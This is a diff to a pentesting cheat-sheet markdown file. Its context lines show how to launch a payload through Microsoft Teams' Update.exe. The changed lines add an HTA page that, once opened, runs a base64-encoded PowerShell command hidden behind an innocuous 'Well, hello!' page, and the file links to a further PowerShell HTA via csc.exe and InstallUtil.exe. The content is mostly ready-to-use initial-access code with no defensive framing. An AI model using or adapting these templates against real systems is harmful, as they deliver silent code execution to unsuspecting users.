@@ -25,69 +25,41 @@ Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. The
 `%userprofile%\AppData\Local\Microsoft\Teams\Update.exe --processStart payload.exe --process-start-args "whatever args"`   
 
 ## Using HTA
-From: https://github.com/jpginc/pentesting-hta
-### exec.hta
-Runs commands using WScript.Shell
+### HTA PowerShell runner
+Runs b64 encoded powershell command using WScript.Shell
 ```
 <html>
 <head>
 <title>HTA exec</title>
 </head>
-
 <SCRIPT LANGUAGE="VBScript">
 Public globalShellObj
 Public globalExecObj
-	sub getOutput
-		std = vbCrLf & globalExecObj.stdout.readall()
-		errr = vbCrLf & globalExecObj.StdErr.readall()	
-		Set div = document.getElementById("output")
-		if std <> "" then
-			div.innerText = div.innerText & std
-		end if 
-		if errr <> "" then
-			div.innerText = div.innerText & errr
-		end if 
-		document.getElementById("right").scrollTop = document.getElementById("right").scrollHeight			
-	end Sub
-
     Sub HandleInput
 		Set globalShellObj = CreateObject("WScript.Shell") 
-		Set globalExecObj = globalShellObj.exec( BasicTextbox.Value)
-		Set div = document.getElementById("output")
-		div.innerText = div.innerText & vbCrLf & "> " & BasicTextbox.Value
-		BasicTextbox.value = ""
-		getOutput
+        If globalShellObj.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
+            Set globalExecObj = globalShellObj.exec("%windir%\Sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -Enc RwBlAHQALQBDAGgAaQBsAGQAaQB0AGUAbQAgACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAXABkAGUAcwBrAHQAbwBwACAAfAAgAG8AdQB0AC0AZgBpAGwAZQAgACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAXABkAGUAcwBrAHQAbwBwAFwAaAB0AGEAbwB1AHQALgB0AHgAdAA=")
+        Else
+            Set globalExecObj = globalShellObj.exec("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -Enc RwBlAHQALQBDAGgAaQBsAGQAaQB0AGUAbQAgACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAXABkAGUAcwBrAHQAbwBwACAAfAAgAG8AdQB0AC0AZgBpAGwAZQAgACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAXABkAGUAcwBrAHQAbwBwAFwAaAB0AGEAbwB1AHQALgB0AHgAdAA=")
+        End If
+    
     End Sub
-	
-	sub runInteractive
-		Set temp1 = CreateObject("WScript.Shell") 
-		temp2 = temp1.run( BasicTextbox.Value, 1, 0)
-	end sub
 
 </SCRIPT>
 
 <body>
 <div id="left" style="float:left;height=100%;">
-	<div>
-		<textarea rows="4" cols="50" id="prompt" type="text" name="BasicTextbox" size="30"></textarea>
-	</div>
-	<div>
-	<input id=runbutton  type="button" value="Run and grab stdin/out (non-interactive blocking)" name="run_button"  onClick="HandleInput">
-	<br>
-	<input id=runbutton  type="button" value="Run without grabbing stdin/out (interactive non-blocking)" name="run_button"  onClick="runInteractive">
-	</div>
-	</div>
-	<div id="right" style="background-color:black;font:Typewriter;color:white;height:100%;max-height:100%;overflow:scroll;">
-		<p id="output">Output will go here</p>
-	</div>
+Well, hello!
+</div>
 	<script>
-		document.getElementById("prompt").focus()
+		HandleInput
 	</script>
 </body>
 </html>
 ```
 
 ### powershell.hta
+From: https://github.com/jpginc/pentesting-hta
 Runs powershell commands taking advantage of csc.exe and InstallUtil.exe
 ```
 <html>
